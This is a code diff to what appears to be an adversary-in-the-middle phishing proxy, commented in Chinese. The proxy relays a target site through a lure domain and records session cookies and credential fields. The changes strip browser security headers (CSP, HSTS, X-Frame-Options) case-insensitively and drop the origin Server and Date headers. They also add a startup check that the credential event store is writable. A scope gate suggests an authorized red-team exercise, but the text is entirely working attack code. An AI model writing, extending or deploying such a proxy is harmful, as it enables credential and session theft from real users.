@@ -88,6 +88,8 @@ def make_handler(phishlet, db_file):
             if extra:
                 ev.update(extra)
             import fcntl
+            # R32D88-F1(P0): 父目录预建(对齐 phish-track:17)——同 phish-proxy。
+            os.makedirs(os.path.dirname(db_file) or '.', exist_ok=True)
             with open(db_file + '.lock', 'w') as lf:
                 fcntl.flock(lf, fcntl.LOCK_EX)
                 try:
@@ -136,11 +138,14 @@ def make_handler(phishlet, db_file):
 
         def rewrite(self, status, headers, body):
             """按 phishlet 重写响应: 剥安全头+域替换+注入追踪"""
-            for h in ['Content-Security-Policy', 'X-Frame-Options',
-                      'Strict-Transport-Security', 'X-Content-Type-Options']:
+            # R32D88-F3: 与 phish-proxy 收敛同款大小写不敏感 STRIP 集
+            # (此前字面 pop——小写头源(nginx/CDN 常态)安全头原样带出)。
+            STRIP = {'content-security-policy', 'x-frame-options',
+                     'strict-transport-security', 'x-content-type-options'}
+            for h in [k for k in headers if k.lower() in STRIP]:
                 headers.pop(h, None)
 
-            ct = headers.get('Content-Type', headers.get('content-type', ''))
+            ct = next((v for k, v in headers.items() if k.lower() == 'content-type'), '')  # R32D88-F2
             if 'text/html' in ct or 'javascript' in ct:
                 text = body.decode('utf-8', errors='replace')
                 # sub_filters: 目标域→代理域(双向)
@@ -214,8 +219,9 @@ def make_handler(phishlet, db_file):
             # CS69-5/CS70-1: respond 诗节×3 收口(跳过逐跳头+重算长度)——
             # DI 批次替换误把本函数体也换成自调用(RecursionError), 此为真身。
             self.send_response(status)
+            # R32D88-F4: 剥 origin Server/Date(同 phish-proxy, 双份畸形)。
             for k, v in headers.items():
-                if k.lower() not in ('transfer-encoding', 'content-length'):
+                if k.lower() not in ('transfer-encoding', 'content-length', 'server', 'date'):
                     self.send_header(k, v)
             self.send_header('Content-Length', str(len(body)))
             self.end_headers()
@@ -281,6 +287,14 @@ def serve(listen, phishlet, db_file):
     scope_gate_full()  # F10: 完整授权门(targets+exercise+window 三必填, CS37-F5)
     host, _, port = listen.rpartition(':')
     handler = make_handler(phishlet, db_file)
+    # R32D88-F1: 启动自检事件库可写(凭据路径开箱即崩防线)。
+    try:
+        os.makedirs(os.path.dirname(db_file) or '.', exist_ok=True)
+        with open(db_file + '.lock', 'w') as lf:
+            pass
+    except OSError as e:
+        print(f'[phishlet-proxy] FATAL: 事件库不可写 {db_file} — {e}', flush=True)
+        sys.exit(1)
     print(f'[phishlet-proxy] {phishlet["name"]}: {listen} → {phishlet["target_host"]}', flush=True)
     print(f'[phishlet-proxy] session cookies: {phishlet.get("session", {}).get("cookie_names", [])}', flush=True)
     print(f'[phishlet-proxy] cred fields: {phishlet.get("credential_fields", [])}', flush=True)
